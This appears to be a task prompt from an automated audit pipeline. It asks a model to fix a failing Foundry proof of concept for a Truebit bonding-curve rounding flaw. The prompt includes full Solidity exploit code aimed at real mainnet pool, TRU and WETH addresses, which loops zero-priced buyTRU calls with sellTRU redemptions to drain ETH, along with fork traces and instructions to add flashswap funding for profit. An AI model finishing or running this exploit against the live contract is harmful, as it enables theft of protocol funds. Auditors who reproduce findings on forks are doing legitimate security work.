You are fixing a failing Foundry PoC for finding TRUEBIT-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Bonding-curve purchase quote can round down to zero, enabling free buys and reserve drain
- claim: The documented `getPurchasePrice` implementation computes the buy quote as `(THETA - 100) * totalSupply^2 / (200 * totalSupply * amount * reserve + 100 * amount^2 * reserve)`. Because the denominator increases with `amount`, a sufficiently large purchase causes the integer-divided quote to floor to `0`. The exploit loop in `testExploit()` shows that the attacker can then call `buyTRU(amount)` with that zero-valued quote and immediately `sellTRU(amount)` for ETH, repeating until the pool is empty. The comments also record live parameters (`THETA = 0x98`, `reserve = 0x9a`) that make the zero-price region reachable permissionlessly.
- impact: An attacker can acquire TRU for free or near-free and redeem it back to the pool for real ETH, draining the pool reserve and causing catastrophic loss of protocol funds.
- exploit_paths: ["Truebit.sol"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface ITruebitPool {
    function getPurchasePrice(uint256 amount) external view returns (uint256);
    function buyTRU(uint256 amount) external payable;
    function sellTRU(uint256 amount) external payable;
    function reserve() external view returns (uint256);
    function THETA() external view returns (uint256);
}

interface IERC20Minimal {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETH {
    function deposit() external payable;
    function balanceOf(address account) external view returns (uint256);
}

contract FlawVerifier {
    address internal constant POOL = 0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2;
    address internal constant TRU = 0xf65B5C5104c4faFD4b709d9D60a185eAE063276c;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint256 internal _profitAmount;
    bool internal _executed;

    receive() external payable {}

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        uint256 startingEth = address(this).balance;
        uint256 startingWeth = IWETH(WETH).balanceOf(address(this));

        IERC20Minimal(TRU).approve(POOL, type(uint256).max);

        for (uint256 round = 0; round < 64; round++) {
            if (address(POOL).balance < 0.1 ether) {
                break;
            }

            uint256 amount = _freePurchaseAmount();
            if (amount == 0) {
                break;
            }

            uint256 quote = _safeQuote(amount);
            if (quote != 0) {
                break;
            }

            uint256 ethBefore = address(this).balance;
            uint256 truBefore = IERC20Minimal(TRU).balanceOf(address(this));

            // Core exploit path from the finding: obtain TRU via the rounded-down
            // zero-value buy quote, then immediately redeem the same amount back
            // to the pool for real ETH.
            ITruebitPool(POOL).buyTRU{value: 0}(amount);

            uint256 truAfterBuy = IERC20Minimal(TRU).balanceOf(address(this));
            require(truAfterBuy >= truBefore + amount, "free buy failed");

            ITruebitPool(POOL).sellTRU(amount);

            uint256 ethAfter = address(this).balance;
            require(ethAfter > ethBefore, "round not profitable");
        }

        uint256 gainedEth = address(this).balance - startingEth;

        // Profit is reported in canonical mainnet WETH, an existing on-chain asset.
        // This accounting step does not change exploit causality.
        if (gainedEth != 0) {
            IWETH(WETH).deposit{value: gainedEth}();
        }

        _profitAmount = IWETH(WETH).balanceOf(address(this)) - startingWeth;
    }

    function _freePurchaseAmount() internal view returns (uint256) {
        uint256 reserve = ITruebitPool(POOL).reserve();
        uint256 theta = ITruebitPool(POOL).THETA();
        uint256 totalSupply = IERC20Minimal(TRU).totalSupply();

        if (reserve == 0 || totalSupply == 0 || theta <= 100) {
            return 0;
        }

        // Finding formula:
        // quote = ((THETA - 100) * T^2) / (200 * T * A * R + 100 * A^2 * R)
        //
        // We solve for an A large enough that integer division floors the quote to 0:
        // 200*T*A*R + 100*A^2*R > (THETA - 100) * T^2
        //
        // Rearranged:
        // (A + T)^2 > T^2 + ((THETA - 100) * T^2) / (100 * R)
        uint256 numerator = (theta - 100) * totalSupply * totalSupply;
        uint256 target = numerator / (100 * reserve) + 1;
        uint256 rootTarget = totalSupply * totalSupply + target;

        uint256 root = _sqrt(rootTarget);
        if (root * root < rootTarget) {
            unchecked {
                root += 1;
            }
        }

        if (root <= totalSupply) {
            return 0;
        }

        uint256 amount = root - totalSupply;
        if (_safeQuote(amount) == 0) {
            return amount;
        }

        // Small upward adjustment preserves the same exploit path while avoiding
        // broad search behavior that can trigger pool-side arithmetic reverts.
        for (uint256 i = 0; i < 8; i++) {
            unchecked {
                amount += 1;
            }
            if (_safeQuote(amount) == 0) {
                return amount;
            }
        }

        return 0;
    }

    function _safeQuote(uint256 amount) internal view returns (uint256 quote) {
        try ITruebitPool(POOL).getPurchasePrice(amount) returns (uint256 q) {
            return q;
        } catch {
            return type(uint256).max;
        }
    }

    function _sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y == 0) {
            return 0;
        }
        if (y <= 3) {
            return 1;
        }

        z = y;
        uint256 x = y / 2 + 1;
        while (x < z) {
            z = x;
            x = (y / x + x) / 2;
        }
    }

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function targetPool() external pure returns (address) {
        return POOL;
    }

    function targetToken() external pure returns (address) {
        return TRU;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 864.62ms
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:68:19:
   |
68 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 120527)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 577021548053172
  AUDITHOUND_BALANCE_AFTER_WEI: 577021548053172
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 100000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 3124

Traces:
  [120527] FlawVerifierTest::testExploit()
    ├─ [197] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [81454] FlawVerifier::executeOnOpportunity()
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [31962] 0xf65B5C5104c4faFD4b709d9D60a185eAE063276c::approve(0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   ├─ [24688] 0x18ceDF1071EC25331130C82D7AF71D393Ccd4446::approve(0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
    │   │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │        topic 2: 0x000000000000000000000000764c64b2a09b09acb100b80d8c505aa6a0302ef2
    │   │   │   │           data: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ [9706] 0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2::reserve() [staticcall]
    │   │   ├─ [2438] 0xC186e6F0163e21be057E95aA135eDD52508D14d3::reserve() [delegatecall]
    │   │   │   └─ ← [Return] 8539408935947150350830 [8.539e21]
    │   │   └─ ← [Return] 8539408935947150350830 [8.539e21]
    │   ├─ [3161] 0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2::THETA() [staticcall]
    │   │   ├─ [2393] 0xC186e6F0163e21be057E95aA135eDD52508D14d3::THETA() [delegatecall]
    │   │   │   └─ ← [Return] 75
    │   │   └─ ← [Return] 75
    │   ├─ [3172] 0xf65B5C5104c4faFD4b709d9D60a185eAE063276c::totalSupply() [staticcall]
    │   │   ├─ [2404] 0x18ceDF1071EC25331130C82D7AF71D393Ccd4446::totalSupply() [delegatecall]
    │   │   │   └─ ← [Return] 161753242367424992669183203 [1.617e26]
    │   │   └─ ← [Return] 161753242367424992669183203 [1.617e26]
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [197] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 24191018 [2.419e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 519.30ms (502.71ms CPU time)

Ran 1 test suite in 522.30ms (519.30ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 120527)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
